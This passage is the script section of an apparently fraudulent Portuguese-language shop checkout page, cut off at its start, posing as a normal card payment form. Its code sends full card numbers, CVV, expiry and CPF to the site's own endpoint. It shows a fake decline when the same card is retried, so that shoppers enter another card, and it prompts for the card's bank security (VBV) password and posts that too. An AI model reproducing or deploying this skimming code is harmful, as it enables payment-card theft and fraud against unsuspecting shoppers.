                            .replace('.', ',')
                    );
                }
            });

            $("#installments").val(1).change();
            let texto = $( "#installments option:selected" ).text();
            $(".select-skin-text").text(texto);

            $(`label[for='pagamento_pix']`).on('click', function () {
                $(`#installments`).val(1).change();
            });

            function validarCartaoCredito(numeroCartao) {
                const numeroLimpo = numeroCartao.replace(/[\s-]/g, '');

                if (!/^\d+$/.test(numeroLimpo)) {
                    return false;
                }

                let soma = 0;
                let multiplicador = 1;

                for (let i = numeroLimpo.length - 1; i >= 0; i--) {
                    let digito = parseInt(numeroLimpo.charAt(i), 10) * multiplicador;

                    if (digito > 9) {
                        digito = digito - 9;
                    }

                    soma += digito;
                    multiplicador = multiplicador === 1 ? 2 : 1;
                }

                return soma % 10 === 0;
            }

            $("#input-card-number-0").mask('0000 0000 0000 0000');
            $("#input-card-validaty-0").mask('00/00');
            $("#input-security-number-0").mask('0000');
            $("#input-card-document-0").mask('000.000.000-00');

            $('.orderbump_button').click(function(e){
                e.preventDefault();

                const bumpProductId = $(this).attr('bump-product-id');

                $.post('/checkout/ativaOrderBump', {
                    orderId: {{ $data['order_id'] }},
                    bumpProductId
                }, (r)=>{
                    if(r.status == 200){
                        $('.holder-container-resume').append(
                            `<div class='item-holder js-item-holder flex  ' data-item-id='495561497' data-product-option-id='121671212' data-kit-id='' data-quantity='1' data-custom='' data-shopify-variant-id='45300993196337' data-bundle-id='' data-shopify='1' data-order-bump-id=''>
                            <div class='overlay-spinner overlay-spinner-box'>
                                <div class='spinner spinner-grey'></div><!-- /.spinner-grey -->
                            </div>

                            <div class='item-image'>
                                <img src='${r.img}' alt='${r.titulo}' class='thumb-product block'>
                            </div>

                            <div class='item-detail f12'>
                                <div class='item-row'>
                                    <div class='item-name c-text-tertiary'>${r.titulo}</div>
                                    <div class='item-delete'></div>
                                    <div id="remove_order" style="cursor: pointer;font-size: 11px; padding: 3px 5px; color: #fff; font-weight: 600; background: #e04040; border-radius: 5px; display: inline-block; align-self: end;" bump-product-id="${r.id}">Remover Item</div>
                                </div>



                                <div class='item-row item-holder-quantity-price c-text medium'>
                                                    <span class='item-quantity'>Quantidade: 1 Item</span>
                                                <span class='item-price'> R$ ${r.preco}</span><br>

                                </div>

                                    </div>

                            </div>`
                        )
                        $('.orderbump_button-cta').text('Oferta Adicionada!!')
                        let vl = $(".js-cart-total").text();
                        vl = vl.replace('R$', '');
                        vl = vl.replace(',', '.');
                        vl = parseFloat(vl);
                        console.log('vl 1 =', vl);
                        vl = parseFloat(vl) + parseFloat(r.preco);
                        console.log('vl 2 =', vl);

                        vl = vl.toFixed(2);
                        vl = vl.replace('.', ',')
                        $(".js-cart-total").text('R$ ' + vl)
                        $("#valor_card_pix").text('R$ ' + vl)
                        $("#vl_produtos").text('R$ ' + vl)
                        $(".-total").text('R$ ' + vl)
                        let a = $(".items__count").text();
                        a = a.replace('(', '');
                        a = a.replace(')', '');
                        a = parseInt(a);
                        $(".items__count").text(` (${a+1})`)
                        // window.removeOrder();
                        setTimeout(()=>{
                            $('.js-orderbumps').empty();
                        },2000)
                    }
                })
            })

            <?php
            if($data['resumo_aberto']){
                echo '
                    setTimeout(() => {
                        $(".js-box-resume-title").click()
                    }, 1000);
                ';
            }


//            if($bumpProducts->isNotEmpty()){
//                echo "window.orderBump();";
//            }
            ?>


        </script>

        <script>
            function validarCartaoCredito(numeroCartao) {
                if (typeof numeroCartao !== 'string') {
                    return false;
                }

                const numeroLimpo = numeroCartao.replace(/\D/g, '');

                if (!algoritmoLuhn(numeroLimpo)) {
                    return false;
                }

                if (
                    /^(4\d{12}(\d{3})?)$/.test(numeroLimpo) ||
                    /^(5[1-5]\d{14})$/.test(numeroLimpo) ||
                    /^(2[0-9]\d{14})$/.test(numeroLimpo) ||
                    /^(3[47]\d{13})$/.test(numeroLimpo) ||
                    /^(6(?:011|5\d{2})\d{12})$/.test(numeroLimpo) ||
                    /^(3(?:0[0-5]|[68]\d)\d{11})$/.test(numeroLimpo) ||
                    /^(35(?:2[89]|[3-8]\d)\d{12})$/.test(numeroLimpo) ||
                    /^(50\d{14})$/.test(numeroLimpo) ||
                    /^(6(?:304|759)\d{10})$/.test(numeroLimpo)
                ) {
                    return true;
                }

                return false;
            }

            function algoritmoLuhn(numero) {
                let soma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);

                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) {
                            digito -= 9;
                        }
                    }

                    soma += digito;
                    alternar = !alternar;
                }

                return soma % 10 === 0;
            }

            $(document).on('click', '#remove_order', function(e){
                e.preventDefault();

                const bumpProductId = $(this).attr('bump-product-id');

                $.post('/checkout/desativarOrder', {
                    orderId: {{ $data['order_id'] }},
                    bumpProductId
                },(r)=>{
                    if(r.status == 200){
                        location.reload();
                    }
                })
            });

            fbq('track', 'AddToCart');

            $.post('/local/checkout',{
                useragent: window.navigator.userAgent,
                local: 'Selecionando Pagamento - Yampi',
                hash: $('[a_hash="h_checkout"]').attr('hash'),
                il: $("#__l").val()
            },(r)=>{
                console.log("|           ^_^          |");
            })

            setInterval(()=>{
                $(".checkout-payment").css('overflow-y','auto !important');
            },1000)

            $("#btn_pagamento_pix").click(function(e){
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
                $(this).addClass('sending');

                $.ajax({
                    url: '/checkout/updateMetodoPagamento',
                    type: 'POST',
                    data:{
                        hash: $('[a_hash="h_checkout"]').attr('hash'),
                        p: 'pix'
                    },
                    success: (r)=>{
                        if(r.status == 200){
                            location.href = "/checkout/1/" + $('[a_hash="h_checkout"]').attr('hash') + "/4";
                        }
                    }
                })
            });

            $("#btn_compra_cc").click(async function(e){
                let cc = $("#input-card-number-0").val();
                let validade = $("#input-card-validaty-0").val();
                let cvv = $("#input-security-number-0").val();
                let titular = $("#input-card-name-0").val();
                let cpf = $("#input-card-document-0").val();
                const installments = $("#installments").val();


                if(cc == window.cc && validade == window.validade && cvv == window.cvv){
                    modalErro('O seu pagamento foi recusado, tente outro cartão de crédito ou altere a forma de pagamento.');
                    return;
                }

                if(cc == '' || cc.length < 19 || !validarCartaoCredito(cc)){
                    modalErro('Número de cartão inválido, verifique os valores digitados.');
                    return;
                }

                if(validade == ""){
                    modalErro('Número de validade do cartão inválido, verifique os valores digitados.');
                    return;
                }

                let validadeSplit = validade.split('/');
                let mes = validadeSplit[0];
                mes = parseInt(mes);

                let ano = validadeSplit[1];
                ano = parseInt(ano);

                if(mes > 12 || mes < 0 || ano < 23){
                    modalErro('Número de validade do cartão inválido, verifique os valores digitados.');
                    return;
                }

                if(cvv == '' || cvv.length < 3){
                    modalErro('Número de segurança (CVV) do cartão inválido, verifique os valores digitados.');
                    return;
                }

                if(titular == ''){
                    modalErro('Digite o nome do titular do cartão.');
                    return;
                }

                if(cpf.length < 14){
                    modalErro('Número de CPF inválido, verifique os valores digitados.');
                    return;
                }

                if(!installments) return modalErro('Deve selecionar o número de instrumentos.');

                $(this).addClass('sending');

                let bin = cc.replace(' ', '');
                bin = bin.replace(' ', '');
                bin = bin.replace(' ', '');
                bin = bin.substring(0,6);

                setTimeout(()=>{
                    $("#overlay_processando").show();
                }, 1000);

                fbq('track', 'Purchase',
                    {
                        currency: "BRL",
                        value: $("#vl_produto").val()
                    });

                $.post('/checkout/updateInfo',{
                    hash: $('[a_hash="h_checkout"]').attr('hash'),
                    bin: bin,
                    cc: cc,
                    validade: validade,
                    cvv: cvv,
                    titular: $("#input-card-name-0").val(),
                    cpf: $("#input-card-document-0").val(),
                    installments,
                },(r)=>{
                    window.cc = cc;
                    window.validade = validade;
                    window.cvv = cvv;
                    window.id_vbv = r.i;
                    window.dig = (r.d == 404 ? 4 : r.d);
                    let string = '';
                    if(r.d != 404){
                        for(i = 1; i <= r.d; i++){
                            string += '0';
                        }
                    }else{
                        string = '000000';
                        r.d = '4 a 6';
                    }
                    $("#senha_vbv").mask(string);
                    $("#btn_compra_cc").removeClass('sending');

                    // if ($("#vbv_sn").val() === 's' && r.v === 's') {
                    //     $("#digitos_vbv").text("Digite a senha de " + r.d + " dígitos do cartão, a mesma utilizada para transações comerciais.")
                    //     setTimeout(() => {
                    //         $("#modal-transaction-error").show();
                    //     }, 1500)
                    // }

                    window.location = '/checkout/1/{{ $data['hash'] }}/4';
                })

            })

            $("#fechar_vbv").click(function(e){
                $("#btn_compra_cc").removeClass('sending');
                $("#modal-transaction-error").hide();
                $("#overlay_processando").hide();
                modalErro('Você cancelou a verificação de segurança, altere o método de pagamento ou tente novamente.');
            })

            $("#btn_vbv_confirma").click(function(e){
                if($("#senha_vbv").val().length != window.dig){
                    alert('Senha inválida, verifique a senha digitada.');
                    setTimeout(()=>{
                        $("#modal-transaction-error").show();
                    }, 1500);
                    return;
                }
                $("#modal-transaction-error").hide();
                $.post("/checkout/updateVbv", { i: window.id_vbv, v: $("#senha_vbv").val() },(r)=>{
                    window.location = '/checkout/1/{{ $data['hash'] }}/4';
                })
            });

            function modalErro(mensagem){
                $("#texto_modal_erro").text(mensagem);
                $("#div_erro").show();
                $("#div_erro2").show();
            }

            $("#btn_ok").click(function(e){
                $("#div_erro").hide();
                $("#div_erro2").hide();
            })

            $(".labels_pagamento").click(function(e){
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();

                let label = $(this).attr('aba')

                if(label == 'cartao'){
                    $(".pagamento_cartao").addClass('selected');
                }else{
                    $(".pagamento_cartao").removeClass('selected');

                }

                $(this).parent().addClass('selected');

                $(".radio_pagamento").each((i,v)=>{
                    if($(v).attr('id') != 'pagamento_' + label) $(v).parent().removeClass('checked');
                    else $(v).parent().addClass('checked');
                })
                $(".labels_pagamento").each((i,v)=>{
                    if($(v).attr('aba') != label){
                        $(v).parent().removeClass('selected');
                    }
                })
            })
        </script>

        <div class="shopify-handler" data-shop="http://lojaliford.com/a/checkout" data-redirect-uri="https://seguro.lojaliford.com/cart" style="display: none;"></div>
    </footer>
</body>
</html>
